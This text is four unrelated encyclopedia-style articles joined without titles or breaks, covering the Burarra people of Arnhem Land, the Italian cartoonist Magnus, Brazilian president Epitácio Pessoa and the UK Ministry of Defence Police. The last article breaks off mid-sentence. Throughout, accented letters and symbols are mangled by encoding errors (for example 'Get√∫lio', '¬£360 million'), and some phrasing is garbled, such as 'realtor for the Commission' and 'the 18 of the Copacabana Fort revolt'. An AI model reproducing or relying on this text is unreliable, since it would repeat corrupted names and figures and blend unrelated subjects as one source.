Opinions have differed as to whether the two names represent different tribal realities, with the Gidjingali treated as the same as, or as a subgroup of the Burarra, or as an independent tribal grouping. For the purposes of this encyclopedia, the two are registered differently, though the ethnographic materials on both may overlap with each other. According to Norman Tindale, there are five sub-groups of Burarra people: Anbara (or Anbarra), Marawuraba, Madia, Maringa and Gunadba. The Burraras' closest neighbours are the Dangbon/Dalabon, Nakara and Yolngu peoples. Name The ethnonym Burarra means 'those people'. Norman Tindale classified the Gidjingali as being eastern Burarra, speaking a dialect only slightly different from Burarra. Les Hiatt argued in 1965 that they were a distinct 'tribe'. Others take Hiatt's Gidjingali to be essentially synonymous with Burarra, and the words are used now interchangeably. Tindale considered Burarra to be an exonym applied to them by outsiders, and speculated that their 'real' name might be Ngapanga. Language Burarra is a prefixing Arnhem land language belonging to the Maningrida family of non-Pama-Nyungan languages. Bururra is spoken by approximately 2,000 people, many of them multilingual. Country Burarra traditional land covers some on both banks of the Blyth River, for a distance of roughly 20 miles inland. Their eastward extension runs as far as and east to Cape Stewart. Facing the Arafura Sea, their territory also extends to some islands, opposite those of their northern maritime neighbours, the Yan-nha≈ãu of the Crocodile Islands. Despite speaking markedly different languages, -one prefixing, the other suffixing- the Burarra and the Yan-nha≈ãu have strong sociocultural links. Their land adjoins that of the Dangbon (or Dalabon), Nakara (Nagara) and Yolngu peoples. Social organisation Though neighbours of such Yolgnu peoples as the Djinang, Burarra marriage practices are markedly at odds with those of the Yolgnu. Ian Keen has said that there are five major differences: * (a) Yolgnu men are more polygamous than their Burarra peers; * (b) while the Yolgnu having a Karadjeri system of kin classification, the Burarra's resembles that of the Aranda; * (c) the rules governing spousal choice are at odds, as are their respective expectations about how flexible older men should be in ceding rights over women to younger men; * (d) Land-owning groups are structured somewhat differently; and * (e) Whereas for the Burarra the named community forms the basic unit for certain types of political action, the Yolgnu organise such activities on a clan basis (occasionally with another clan). =Clans and Moieties= The Burarra, according to Tindale, consist of five subgroups: # Anbara (western bank of the mouth of the Blyth River) # Marawuraba (from the coast to the east of Blyth River) # Madia (Cape Stewart area) # Maringa # Gunadba (Gunaidbe) Each of the five have a Yirritja/Dua moiety division.

Biography Born in Bologna in 1939, he studied at Academy of Fine Arts. Raviola lived there for his whole life. Having worked as an illustrator, he started his comics career and his association with Max Bunker in 1964 with the series Kriminal. He took the pseudonym Magnus, from the Latin phrase Magnus Pictor Fecit (\\"A Great Painter Did It\\"). During the 1960s the duo became a mainstay of Italian comics creating successful series such as Kriminal and Satanik (1964), Dennis Cobb, Gesebel (1966, only first six stories by Magnus) and Maxmagnus (1968). Magnus' atmospheric use of black and white was instrumental un launching a new comics genre, called fumetti neri (black comics/adult comics). In 1967 Magnus & Bunker started working on a new series resulting in the May 1969 release of the humorous Alan Ford. After leaving Alan Ford in 1975, Magnus began an association with Renzo Barbieri's publishing house, which was specialized i the erotic comics genre. In the 1970s works like Midnight of Fire, Ten Knights and a Wizard, Vendetta Macumba and The Living Skull came out. Magnus continued creating the long saga The Outlaws and in 1975 he started the Lo Sconosciuto (a character whose lastname is Unknow, intentional misspelling of \\"Unknown\\") series, today considered one of Magnus' finest creations. In 1977 The Company of the Gallows series appeared. During the 1980s he created two science fictional heroines: Milady 3000 (1980‚Äì1984) and Necron's Frieda Boher, written by Ilaria Volpe. Milady, translated also in France on Metal Hurlant magazine, is a science fiction series where Chinese culture, Flash Gordon and Star Wars' influences, erotism and technology are well mixed. Magnus briefly returned to Alan Ford in 1986, to draw the 200th episode. Subsequently, inspired by eastern literature, he created The 110 pills, Fiori di prugno in un vaso d'oro and The Enchanted Women. In 1989 Magnus began his last work, a long story featuring the popular Italian western character Tex, written by Claudio Nizzi: for it Magnus completed 223 exceedingly detailed plates in 7 years of work, for which he used original sources for any historical element, and studied from live any natural detail such as leaves, light and trees. In August 1991 Magnus had moved to Castel del Rio, near Bologna, where he spent his last years and died of cancer just few days after completing his Tex story.

His period of government was marked by military revolts that would culminate in the Revolution of 1930, which brought Get√∫lio Vargas into control of the federal government. In addition to his term as president, Pessoa served as Minister of Justice, a justice in the Supreme Federal Tribunal, Attorney General, a two-term Federal Deputy, a three-term Senator, Chief of the Brazilian delegation for the Treaty of Versailles, and a judge on the Permanent Court of International Justice. Biography Epit√°cio Pessoa was born in Umbuzeiro, a small town in the state of Para√≠ba. His parents died of smallpox when he was only seven years old. He was taken in and educated by his uncle Henrique de Lucena, then the governor of Pernambuco. Pessoa endured a very poor childhood, but with great effort managed to earn a degree in law from the Faculty of Law of the Federal University of Pernambuco, where he went on to become a professor. He eventually made his way to Rio de Janeiro. Young Epit√°cio managed to make the acquaintance of Marshal Deodoro da Fonseca through the connections of his eldest brother Jos√©. With the proclamation of the Brazilian Republic he was invited by governor Ven√¢ncio Neiva to serve as secretary-general of the first republican government of Para√≠ba. He was a deputy to the constituent assembly from 1890 to 1891, during which time he was noted as a standout figure. By the time he was twenty-five years old, he was already noted as an accomplished jurist. During his time in the Constituent Assembly, Pessoa gave an outstanding speech in which he articulated the political responsibilities of the President of the Republic. In 1894, he resolved to abandon politics because of his disagreements with then-president Floriano Peixoto. After marrying Maria da Concei√ß√£o Manso Sai√£o, he left for Europe. After his return to Brazil he became Minister of Justice in the government of Campos Sales, during which time he invited Cl√≥vis Bevil√°qua, a colleague from his days as a professor at the Faculty of Law of the University of Recife, to write a civil code for the country that would eventually be adopted in 1916. After leaving the Ministry of Justice, Pessoa would then successively serve as Minister of Transportation, Justice of the Supreme Federal Tribunal, and Attorney General of the Republic. Levi Carneiro, in his \\"Livro de um Advogado\\", notes that as a justice Pessoa never voted in favor of any case in which he had been assigned to elaborate the views of the court. Elected as a senator for his home state of Para√≠ba in 1911, Pessoa then moved to Europe, where he lived until 1914. Returning to Brazil, he would soon assume the post of realtor for the Commission for the Verification of Powers. With the end of the First World War, Pessoa was chosen to lead the Brazilian delegation for the Treaty of Versailles in 1919. Ruy Barbosa had originally been chosen to lead the delegation, but he resigned and Pessoa was picked as his substitute. The Brazilian delegation, which supported the aims of the United States, obtained good results in its attempts to resolve issues that Brazil had an interest in: the sale of Brazilian coffee that had been stored in European ports and the fate of 70 German ships seized by Brazil during the war. Pessoa disputed the succession of Delfim Moreira, the vice-president of president-elect Rodrigues Alves, who had died before he could take office. He won the presidency of the Republic by defeating the septuagenarian Ruy Barbosa in a snap election without having even left France, the only such case in the history of the Brazilian republic. His candidacy had been supported in Minas Gerais and was considered fairly symbolic. The election of a president from Para√≠ba represented a defeat for the old political system of caf√© com leite, with the election of Marshal Hermes da Fonseca from Rio Grande do Sul a decade earlier being the only previous exception. Regardless, Pessoa still represented the interests of the traditional oligarchies of Minas Gerais and S√£o Paulo. There is another view of this election, however: the belief that after the death of Rodrigues Alves the elite of Minas Gerais and S√£o Paulo wanted to choose a new candidate from outside their own ranks. That Artur Bernardes of Minas Gerais was elected president in the next election supports the conspiracy theory that the oligarchies had never lost control in the intervening years. Pessoa was an unavowed racist. He banned the involvement of Brazil's black football players in the 1921 Copa Am√©rica, the South American football championships. Presidency Brazil had greatly improved its financial situation over the course of the First World War. The industrialized countries had been forced to concentrate all of their resources towards the arms industry. Brazil exported raw materials at compensatory prices and enlarged its industrial base, manufacturing products that were previously imported. With the end of the war, Europe began to rehabilitate its industries. At the same time, Brazil was plagued with a number of workers strikes, and the business community along with the coffee-growers tried to reimpose their control. In response to these events, Pessoa introduced a program of austere financial planning. Nevertheless, the pressures on the State continued to grow. New loans, totaling nine million pounds, financed the retention of green coffee in Brazilian ports. Another loan was secured from the United States for the electrification of the Estrada de Ferro Central do Brasil. Pessoa did not escape from the intrigues of state politics and used the federal government to intervene on behalf of state-based interest groups in return for support in Congress. He was embroiled in one of the most troubled periods in the history of the Old Republic with the outbreak of the 18 of the Copacabana Fort revolt on 5 July 1922, the crisis of the false letters (see below) and the revolt of the Military Club. The process of finding a successor for Pessoa therefore happened within a highly charged climate in which the lieutenants and subalterns (the tenentes) of the Armed Forces called for profound political reforms. =Crisis of the False Letters= In 1921, the Correio de Manh√£ published letters supposedly sent by Artur Bernardes and Raul Soares de Moura that contained insults towards the Armed Forces and Marshal Hermes da Fonseca. A commission attested to the veracity of this correspondence. A year later, Bernardes claimed victory in the presidential elections. In response, the Military Club and the noted politician Borges de Medeiros called for the creation of a court of honor to review the legitimacy of Bernardes' election. The Federal Congress reviewed the election results and declared them legitimate. Notable facts Statue honoring Epit√°cio Pessoa Pessoa's principal acts as president were the following: * The construction of more than 200 dams in Northeast (Considered the largest accomplishment of his government). * The creation of the University of Rio de Janeiro ‚Äì considered by official historians at the time to be first one of its kind in Brazil, though the Universidade do Paran√° had been created almost a decade before, in 1912. * The commemoration of the first centenary of independence. * The opening of the first radio station in Brazil. * The substitution of the pound for the dollar as the basis of the nation's monetary standard. * The construction of more than 1000 km of railroads in the south of Brazil. * The nomination of a civilian ‚Äì the historian Pandi√° Cal√≥geras ‚Äì for Minister of War. * The defeat of the 18 of the Fort of Copacabana Revolt. * Successful inroads into creating public works to lessen the droughts of the Northeast region. * Abolished the law that banished the Brazilian Imperial Family from national territory. Last years After leaving the presidency, Epit√°cio Pessoa was elected to be a Justice of the Permanent Court of International Justice at The Hague, and stayed on the bench until November 1930. From 1924 until the Revolution of 1930, he was a senator for Para√≠ba. He supported the revolution, which implemented the ideals of earlier army revolts. The assassination of his nephew Jo√£o Pessoa was a strong emotional blow to Epit√°cio, and in its aftermath he retired from public life. In 1937, he began to show signs of declining health. He developed Parkinson's disease and severe heart problems. Epit√°cio Pessoa would live until 13 February 1942, when he died in Nova Bet√¢nia, part of Petr√≥polis (Rio de Janeiro). In 1965 his remains, along with those of his wife, were transported to Jo√£o Pessoa, Para√≠ba, for reinternment. Academia Paraibana de Letras Pessoa was the patron of chair no. 31 of the Academia Paraibana de Letras, which was founded by Father Francisco Lima.

The MDP are not military police and should not be confused with the Royal Military Police or any other Service Police organisation. Although superficially similar to other UK police forces, the MDP is significantly different in role, function and accountability. The MDP's primary responsibilities are to provide armed security and counter terrorism services, as well as uniformed policing and limited investigative services to Ministry of Defence property, personnel, and installations throughout the United Kingdom. The different role is clearly borne out by the number of arrests made by MDP officers against forces with similar numbers of police officers (Sussex Police and Avon and Somerset Constabulary). In 2016, MDP officers made 61 arrests.https://assets.publishing.service.gov.uk/government/uploads/system/uploads/attachment_data/file/685621/2018-01425.pdf In comparison, in the year ending March 2017, Sussex Police made 17,506 arrests whilst Avon & Somerset Constabulary recorded 26,694 arrests for notifiable crimes. MDP officers are attested as constables under the Ministry of Defence Police Act 1987. All MDP officers are trained as Authorised Firearms Officers (AFOs) and 90% of those on duty are armed at any given time. The force was originally formed in 1971 by the merger of three separate service constabularies: the Air Force Department Constabulary, the Army Department Constabulary, and the Admiralty Constabulary. The force, which consists of two divisions, is headquartered at MDP Wethersfield, Essex. The force has a number of specialised departments and also provides officers for international policing secondments; including overseas and training of resident police forces in these areas. These overseas missions are carried out under the mandates of the United Nations, NATO, or the Foreign and Commonwealth Office. Most recent overseas deployments have been to Afghanistan to train Afghan National Police(ANP) forces in policing skills. The MDP underwent a significant restructuring as part of the coalition government's post 2010 austerity measures, and the Strategic Defence and Security Review. Its budget was cut from ¬£360 million to ¬£180 million and it was to lose 20% of its manpower and up to 50% of its stations by 2016. The new, smaller force will concentrate on \\"high end\\" tasks such as nuclear weapons security and mobile armed policing of the defence estate. As of March 2019 the force had a workforce of around 2,549 police officers and 227 police staff based at numerous defence and infrastructure locations across the United Kingdom. In terms of officer numbers, it is the second largest of the three special police forces and 18th largest of the 48 police forces of the United Kingdom overall. The MDP has the second highest number of officers trained as AFOs of any police force, after the Metropolitan Police Service, who as of March 2019, had 2,623 AFOs. History The Ministry of Defence Police was formed in 1971 by the merger of three civil constabularies, the Air Force Department Constabulary (previously under the control of the Air Ministry), the Army Department Constabulary (previously under the control of the War Office), and the Admiralty Constabulary (previously under the control of the Admiralty).Button, Mark (2002). Chapter 5: \\"Specialised police organisations\\". In: Private Policing. Cullompton: Willan Publishing. These earlier constabularies were formed as a result of the Special Constables Act 1923, although their histories can be traced back much further as watchmen. Their powers came from different legislative sources. In 1984, the House of Commons Defence Select Committee recognised the difficulties under which the Ministry of Defence Police were operating; the committee's recommendations led to the passing of the Ministry of Defence Police Act 1987. During the period 2004 ‚Äì 2013 the MDP was part of the wider Ministry of Defence Police and Guarding Agency (MDPGA) together with the civilian uniformed Ministry of Defence Guard Service (MGS). As a result of cuts made to the UK defence budget, arising from the Strategic Defence and Security Review of 2010, the MDPGA was disbanded on 1 April 2013. The MDP returned to standalone police force status. The MGS was cut heavily and became part of the new Defence Infrastructure Organisation. Function MDP officers conducting a firearms search of a warship 2007 The MDP's primary responsibility is protecting sites of national importance throughout the United Kingdom, mostly through provision of Authorized Firearms Officers at high security sites. As such, it deals with both military personnel and civilians. Although some critics in the press and pressure groups consider the MDP to be a paramilitary force, this is a claim that is denied by the MDP and the UK government. The Ministry of Defence's requirement of the MDP is expressed in six core capabilities: * Armed nuclear security * Territorial policing and security * Intelligence gathering and analysis to support the efficient and effective deployment of MDP resources * The prevention, investigation and detection of fraud and corruption, and the theft of or criminal damage to key defence equipment and assets. * To provide specialist civil policing support to defence and other international policing commitments, in support of UK government policy. * To maintain specialist policing capabilities that can be deployed at short notice as part of the response to unforeseen requirements at defence establishments in the UK. =Deployment and locations= The MDP is currently deployed at approximately 36 defence locations around the United Kingdom. These include‚Äîbut are no longer limited to‚Äîmilitary establishments, defence housing estates, military training areas, the royal dockyards, and the Atomic Weapons Establishment. Since January 2008, the MDP has also taken on the role of providing armed security at four gas terminals in the UK, part of the critical national infrastructure. In February 2015, the MDP deployed officers to GCHQ Cheltenham on a full-time basis; this was in response to the 2014 increase to the UK threat level from international terrorism. The MDP once had a presence at 120 Ministry of Defence sites such as the Royal Arsenal, munitions and storage depots, Royal Ordnance Factories, and Defence Research Establishments. The end of both the Cold War and The Troubles in Northern Ireland, along with the subsequent closure of the Royal Arsenal, Woolwich, and the privatisation of entities such as the Royal Ordnance Factories reduced the number of sites that need an MDP presence. Many armed forces locations that previously relied upon the MDP for armed security have transferred that role to the Military Provost Guard Service. Some have retained an MDP presence for purely policing purposes, albeit in reduced numbers. Jurisdiction MDP officers armed with MP7s patrol the Government Security Zone in Whitehall, London. MDP officers are attested as constables in one of the three jurisdictions of the United Kingdom: England & Wales, Scotland and Northern Ireland, but can exercise their powers in matters relating to the Ministry of Defence Estate throughout the United Kingdom, and additionally in the circumstances described below. MDP officers' natural geographic jurisdiction relates to MOD property and land as set out in section 2 of the Ministry of Defence Police Act 1987, which was amended by the Anti-terrorism, Crime and Security Act 2001. MDP officers also have police jurisdiction in relation to certain persons connected with the MOD, crime related to the MOD and the escorting of the movement of MOD property anywhere in the United Kingdom. The MDP is classified by the Serious Organised Crime and Police Act 2005 as a special police force. This gives MDP officers conditional allowance to exercise the powers available to a constable of a territorial police force if an offence or incident is encountered outwith their natural jurisdiction. Additionally, the MDP is able to provide officers and specialist units to territorial police forces on a mutual assistance basis. MDP officers are able to take on the powers of constables of territorial police forces, or other special police forces, such as British Transport Police, in certain situations. This is known as 'extended jurisdiction' and use of these powers is set out in the Ministry of Defence Police Act (as amended). Protocols are in place which govern the relationships between the MOD Police and local forces under these circumstances. =Policing protocols with other forces= Local agreements with territorial police forces are made under the overarching general protocols agreed between the MDP Chief Constable and other chief constables. These set out the agreed working relationship between the MDP and other police forces; outlining, where necessary, areas of responsibility and accountability. The Protocols make provision for consultation and co-operation between the forces, with the aim of delivering the best policing on the ground. Oversight Unlike the other special police forces in the United Kingdom, the MDP does not have a police authority to oversee the functions of the force; however, the Ministry of Defence Police Committee, established by the Ministry of Defence Police Act 1987, advises the Secretary of State for Defence on matters concerning the MDP.section 1, Ministry of Defence Police Act 1987; The Ministry of Defence Police (Committee) Regulations 2009 The committee (or its members) also has various functions in determining police misconduct and appeals cases.The Ministry of Defence Police Appeals Tribunals Regulations 2009 and The Ministry of Defence Police (Conduct) Regulations 2009 According to the Terms of Reference of the MOD Police Committee, the committee is responsible for: * providing scrutiny and guidance to ensure that police powers and authority are impartially and lawfully exercised by the Chief Constable * confirming that the MDP is meeting the standards required of a police force * confirming that the MDP's exercise of its authority is responsible, proportionate and impartial * confirming that MOD's use of the MDP is appropriate in relation to the exercising of policing powers and authority * providing scrutiny and guidance on matters of efficiency and effectiveness and on any other matter in relation to the use of policing powers which fall within the responsibility of the MDP * considering the MDP's targets, financial performance and risk management arrangements * providing advice once a year to the top-line budget holder covering financial performance and risk management for inclusion in the Annual Assurance Report * assisting in the appointment of Chief Officers to the MDP * considering all complaints made against MDP Chief Officers (this responsibility may be delegated to a sub-panel of the committee) * undertaking all responsibilities required of the MDP Conduct and Appeal Regulations * submitting an annual report to the Defence Secretary on the MDP's discharge of policing powers, and providing advice to ministers and the department, on matters concerning value for money and efficiencies * publishing the operating costs and expenses of the Committee each year Command structure Since 1995, its headquarters has been located at the former United States Air Force base at Wethersfield, presently designated MDP Wethersfield. Force-wide command and control facilities are provided from the Central Control Room and Gold Command Suite. Wethersfield is also home to the Force Training Centre, which is responsible for the initial training and development of all MDP Constables. The MDP uses the standard British rank structure with its own Chief Constable, the rank structure can be seen below: The MDP has two land- based functional divisions (reduced from five Geographic Divisions as part of SDSR in April 2012): * Nuclear Division * Territorial Division Each division is commanded by a Chief Superintendent and has its own support groups which are able to respond at short notice to any unforeseen incident or emergency. Each station is commanded by a Senior Police Officer who will vary in rank from Sergeant to Superintendent depending on the station's size, role and staffing. Personnel RMP NCO‚Äîpatrol Exeter city centre on OP Dissuade, the policing of alcohol-related disorder by off-duty service personnel. At October 2013, the force strength was around 2,700. According to the 2019/20 Policing Plan, the MDP has a workforce of around 2900 police officers and 260 police staff based at numerous defence locations across the United Kingdom.https://assets.publishing.service.gov.uk/government/uploads/system/uploads/attachment_data/file/812544/MOD_Police_- _Policing_Plan_201920_Web_Copy.pdf =Entry requirements= Entry requirements for new officers are similar to UK territorial police forces; however, because all MDP officers can carry firearms, the eyesight focal acuity standard and basic fitness standard is higher. Entrants must also be British nationals. The MDP recruits nationally and new entrants may be given a posting anywhere in the UK. In practice, most new entrants are initially posted to nuclear division; either at one of the two AWE establishments in South East England or one of the stations in Western Scotland. Officers were formerly selected via the College of Policing's SEARCH process. This was replaced in 2017 by a 1-day Recruit Assessment Centre (RAC) developed specifically for the MDP. This process includes a briefing, candidate presentation, competency based interview, numerical assessment, verbal reasoning assessment, report writing exercise and bleep test to level 7.6. =Initial training= MDP recruits are trained at the Force Training Centre at Wethersfield on an 18-week fully residential course. The program follows the College of Policing initial learning and development syllabus. An MDP anomaly is that there are separate English Law and Scottish Law classes dependent on the individual officer's posting. Recruits are trained in personal safety including PAVA, extendable baton and kwikcuffs. They also receive level three public order training. The final stage of the course includes the police basic driver assessment and an 8-week Authorised Firearms Officer course held at the Firearms Training Centre at MDP Wethersfield. =Security clearance= In addition to pre-entry security checks, all MDP officers are required to hold at least UK Government Security Check (SC) clearance (which clears the holder to UK Secret level). All Nuclear Division officers, and about 30% of all other officers, are required to hold Developed Vetting (DV) status which involves an intrusive background investigation and formal interviews. DV status clears the officer to UK Top Secret level. Not all officers pass the DV process; such officers are then employed at SC security level within the force. Those officers working with US Forces in the UK are required to hold a US Common Access Card for which the US Government carries out its own security checks on the officer. =Terms and conditions= New entrants perform a two-year probationary period. The minimum starting pay for newly recruited MDP Constables is ¬£22,968http://www.mod.police.uk/recruitment/pay-benefits.html and the leave new recruits are entitled to is twenty-two days which rises to thirty days after 20 years service. Discipline in the MDP is governed by the Ministry of Defence Police (Conduct) Regulations 2009, which broadly resemble the Police (Conduct) Regulations 2008 that govern territorial police forces. MDP officers retain a full national mobility liability, and can be posted anywhere in the UK at any time. In practice most movement is voluntary, either on promotion or requested moves for personal reasons. MDP pay follows the same scale as territorial police forces; however, MDP officers are part of the Civil Service Pension Scheme, not the Police Pension Scheme and only contribute 3.5% of their gross salary, compared to territorial police force officers who contribute 11%. To even out this anomaly, MDP officers pay is abated. This is known as the MDP Net Pay Deduction.Ministry of Defence Police ‚Äì Protecting the UK's Defence Capability The MDP operates a random and 'with cause', alcohol and drugs screening policy. An annual fitness test for all AFOs is to be introduced. MDP officers are eligible for the Principal Civil Service Pension Scheme (ALPHA). =Defence Police Federation= The MDP has its own federation separate from Home Office police federations. The Defence Police Federation (DPF) was created in 1971 and has legal status by provision of the Ministry of Defence Police Act 1987. The DPF functions in a similar fashion to a trade union and membership is voluntary. Like all UK police forces the MDP does not have the right to take strike action. The DPF has in recent years concentrated its efforts on what it sees as unfair conditions leveled on MDP Officers in comparison to other Home Office (HO) and Special Police forces. These include: * Pay ‚Äì MDP Officers are only paid 95% of the salary other officers receive. This includes Civil Nuclear Constabulary(CNC) Officers, who now have full pay parity with HO Forces. * Pension ‚Äì MDP Officers are currently enrolled as part of the Civil Service Alpha Pension scheme on joining, not the standard police pension scheme. * Retirement Age ‚Äì MDP Officers are currently expected to work until age 65. This includes qualifying yearly as an AFO and completing the bleep test to 7.6. The DPF is currently co-operating with a study by the University of Loughborough to determine how realistic these fitness expectations are of officers as they age. According to Naval Medicine Studies, a 65-year-old achieving this standard would require the fitness levels of an olympic athlete. Uniform, armament and equipment MDP Nissan Pathfinder MDP protected patrol vehicle (Battenburg Markings) =Uniform= The majority of MDP officers are employed on firearms duties and wear black polo-type shirts and trousers with black jackets. Headdress depends on role, and is either a police baseball cap, or the standard UK police checkered flat cap (for men) or bowler hat (for women). Officers are still issued with custodian helmets and those engaged in general police duties, such as Defence Community Police Officers, may wear them while on patrol. Ballistic body armour is issued to all officers, and a black Kevlar helmet can also be worn by officers engaged on firearms duties, when required. Specialist MDP officers of the Tactical Firearms Unit and Special Escort Group often wear dark blue Nomex coveralls operationally. The Tunic dress uniform worn by MDP officers is almost identical to that of the Metropolitan Police Service, apart from insignia. =Armament= Aside from their personal body armour, PAVA incapacitation spray, batons and Hiatt speedcuffs, MDP officers are trained to use firearms and about 90% are armed at any one time. Most officers are armed with the force weapon, the Heckler & Koch MP7, while some specialist units use weapons such as the Heckler & Koch MP5 and/or the Diemaco C8. Such units include those working within the Government Security Zone, the Tactical Firearms Unit and Special Escort Group. Some officers carry a SIG P229 sidearm, however this is being phased out in favour of the Glock 17. All armed officers carry (or have immediate access to) Less-lethal weapons which are the Taser and/or 37mm AEP Baton Launcher. Officers within the Nuclear Division and those working with Nuclear Weapons or special nuclear material carry the Colt Canada C8 (L119A2) assault rifle, fitted with the Trijcon dual ACOG sight and RMR. =Vehicles= The MDP uses a variety of vehicles, from general patrol cars to specialised escort vehicles, police launches, and off- road vehicles. In 2006, the force adopted the 'Battenburg' system of retro- reflective markings for its new vehicles. This brings the MDP's fleet appearance in line with most other UK police forces. Vehicles commonly used by the MDP for general patrol purposes include the Mitsubishi Shogun, Ford Mondeo, Ford S-Max, Land Rover Discovery and Land Rover Discovery Sport. Some specialist units also have use of BMW X5s. Unmarked vehicles are also widely used by MDP. AWE stations and the Special Escort Group use the Armoured MacNeillie Mercedes Protected Patrol Vehicle. Where used on public roads, these are coloured dark blue, with Battenburg markings. When used only within Ministry of Defence establishments, they are coloured olive drab with black 'Police' markings. This vehicle replaced the MDP's previous armoured vehicle, the Alvis Tactica, in 2010. Special capabilities MDP launch in Portsmouth RIB at Clyde DPM Mk4 Military CBRN suit. Operationally MDP wear Blue Mk4 CBRN suits) MDP explosives detection dog searching vehicles MDP Operational Support Unit officers =Marine unit= The MDP has a large marine fleet. The marine support units are responsible for the waterborne security of Her Majesty's Dockyards and HM Naval Bases. The marine support units are based at HMNB Portsmouth, HMNB Devonport and HMNB Clyde. At HMNB Clyde, the marine unit works with the Fleet Protection Group Royal Marines. see also ‚Äì island-class patrol vessel (2013) =Chemical, biological, radiological or nuclear response= Although only constituting 1.5% of the national police force, the MDP has 8% of the national chemical, biological, radiological and nuclear (CBRN) response capability. Officers deployed to Nuclear Division are trained in CBRN defence and to work in radiologically controlled environments. The force maintains a large pool of specially-trained officers nationally, known as the Nuclear Guard Force (NGF), who can be deployed at short notice in the event of a nuclear accident; they perform this function alongside the UK's national Nuclear Accident Response Organisation (NARO). =Dog sections= The MDP has the second largest number of police dogs of any UK police force and utilises explosive, drug, tactical firearms support, and general purpose police dogs. =Special Escort Group= The MDP Special Escort Group protects nuclear weapons and defence special nuclear material in transit. =Criminal Investigation Department= The MDP has a Criminal Investigation Department that works throughout the UK. The CID investigates defence-related crime, including serious fraud. There are a number of specialised units that fall under the larger CID remit. Officers employed within these specialised units must first qualify as a detective. Such units include: * Force Intelligence Bureau: The FIB consists of a number of specialists, such as Crime Intelligence Officers, CHIS handlers, Communications Data Investigators (SPoCs), and Special Branch officers who support other investigators, carry out investigations, and gather operational intelligence in cases that merit their attention. * Crime Scene Investigation: The Force has a small number of Crime Scene Investigators (CSI), formally known as Scenes of Crime Officers (SOCO). * Major Incident Unit: The Major Incident Unit (MIU) is a group of specially-trained investigators who provide oversight and management of incidents that have caused serious disruption, or in support of complex investigations. Officers in the MIU are trained in the use of the HOLMES software suite and have a variety of specialist equipment at their disposal. =Central Support Groups= The Force has three Central Support Groups (CSGs), which provide regional support where additional resources are needed. These are located at Aldershot, Bicester and Scotland. =Operational Support Units= Operational Support Units (OSU). The OSU is the MDP's mobile, flexible reserve. Each OSU is a rapid response unit tasked with operational support, public order and anti-terrorist search duties. The force has two OSU units, one covering the north of the country, the other covering the south. OSU South is based at MDPGA Wethersfield, OSU North is based at RAF Linton-on- Ouse. =Tactical Firearms Unit= The Tactical Firearms Unit is a specialist group of officers within the AWE Division. MDP TFU is tasked with, and equipped to provide, an advanced firearms response capability at short notice to the Atomic Weapons Establishment. The TFU specialises in dynamic entry and dynamic intervention inside Nuclear Weapons facilities; including, if necessary, the recapture of Nuclear Weapons and special nuclear material.Ministry of Defence Police ‚Äì Protecting the UK's Defence Capability =Defence community police officers= DCPOs are unarmed MDP officers who provide community policing to Defence establishments or large military housing estates, in a similar manner to the Neighbourhood Policing Teams of territorial police forces. DCPOs generally work in single-officer posts and often work from within defence community centres or service police stations. In 2013, the number of Defence sites covered by Defence community police officers was cut, from over 40 locations nationwide to 16 locations. =Project Servator= The MDP has been implementing Project Servator as a new effects-based policing tactic since 2016 to deter and detect criminal and terrorist activity, as well as to reassure the various communities they serve. Project Servator tactics provide a strategic approach to defending sites that the MDP protects and are part of the Force's drive to deploy resources efficiently and effectively within its Operational Policing Model. Project Servator is utilised in and around the sites that the MDP protect across the UK, including HMNB Portsmouth, AWE Aldermaston,AWE Burghfield, HMNB Clyde, RNAD Coulport and Whitehall. A surge capability is also available where required. The MDP work closely with: Police Scotland, Metropolitan Police Service, City of London Police and British Transport Police, who also operate Project Servator in the areas close to the communities that the MDP serves. =International policing= The MDP has carried out a number of international policing activities, including overseas and training of local police forces in these areas. These overseas missions have been conducted under the mandates of the United Nations, NATO, Ministry of Defence, and the Foreign and Commonwealth Office. MDP officers employed overseas are typically armed for personal protection. The MDP has been one of the largest contributors of UK police officers to overseas policing missions, with the majority deployed to Kosovo and Afghanistan. The MDP have provided officers to police contingents in many locations around the world, including: *British Indian Ocean Territory *Bosnia *Kosovo *Sierra Leone *Sudan *Georgia *Palestine *Iraq *Afghanistan The MDP also provided policing for the Pitcairn Islands from around 2000 until 2007, when the islands employed their own full-time police officer. Notable incidents and investigations 1997: Milos Stankovic: British Army officer Major Milos Stankovic MBE, whose father was a Serbian, was arrested and interviewed by the MDP in 1997 under the Official Secrets Act acting on information that alleged that he, while serving as a Serbo-Croat interpreter for senior British Army officers in Sarajevo, passed sensitive information to the Bosnian Serbs. During the investigations, MDP officers interviewed more than 100 witnesses in Britain and abroad. But the investigation, which cost more than ¬£250,000, found no evidence of espionage. The case did not proceed to trial. Stankovic went to the press, and sued the MDP for ¬£1 million compensation. In 2007, Mr Justice Saunders threw out the majority of his case and awarded just ¬£5,000 for the MDP \\"seizing and removing items outside the terms of a search warrant\\" but making Stankovic liable for all costs (circa ¬£500,000) \\" * 1998, Tony Geraghty: British‚ÄìIrish author and journalist Tony Geraghty was arrested and his house searched by MDP Special Branch, investigating offences against the Official Secrets Act involving his contact with a former Northern Ireland bomb disposal officer Lt Col Nigel Wylde. Wylde was subsequently charged with passing secrets to Geraghty, but the case collapsed during trial. It caused much concern in the media that the MDP was effectively beyond public accountability and had the power to impede the freedom of the press. * 2003‚Äì2004, Pitcairn Island Child Abuse investigations (Operation Unique): MDP officers were deployed to Pitcairn as part of the international investigation team into communal child sexual abuse on the island. * 7 July 2005, Response to London suicide bombings (Operation Toga): This operation saw a significant deployment of firearms officers on a non- Ministry of Defence tasking, to assist the Metropolitan Police to counter the threat of further suicide attacks in Central London. * 2001‚Äì2005, Deepcut Barracks suspicious deaths of four soldiers: MDP CID Involvement in investigations, which later led to a complaint to the Independent Police Complaints Commission by the deceased's families, who refused to believe police conclusions that each of the deaths by shooting of the soldiers was suicide, but an independent review by Nicholas Blake QC in 2007 absolved Surrey Police and MDP of any wrongdoing, but was highly critical of the Army. The events of the deaths are the subject of the stage play \\"Deep Cut\\" by Philip Ralph. * 2006, Ipswich Prostitute Murders: MDP provided an OSU and 100 additional officers for searches and enquiries at the request of Suffolk Constabulary following the murder of five women by Steve Wright * 2008, Helmand Province (Afghanistan): A counter-heroin operation by Afghan National Police and MDP seized 17.5 tonnes of opium poppy seeds (enough for 30 tonnes of pure heroin) * 26 January 2009, Death of Krzysztof Lubkiewicz: The IPCC investigated the MDP after the death of a Polish national immediately after contact with MDP Officers. The Officers themselves were later exonerated; however, the IPCC criticised the MDP's divisional control room's procedures, and their communication with other forces. This was the first investigation of the MDP by the IPCC after its jurisdiction was extended to include the MDP in 2008. * 29 September 2010: The leak of Secretary of State for Defence Liam Fox's letter to Prime Minister David Cameron: MDP CID London and 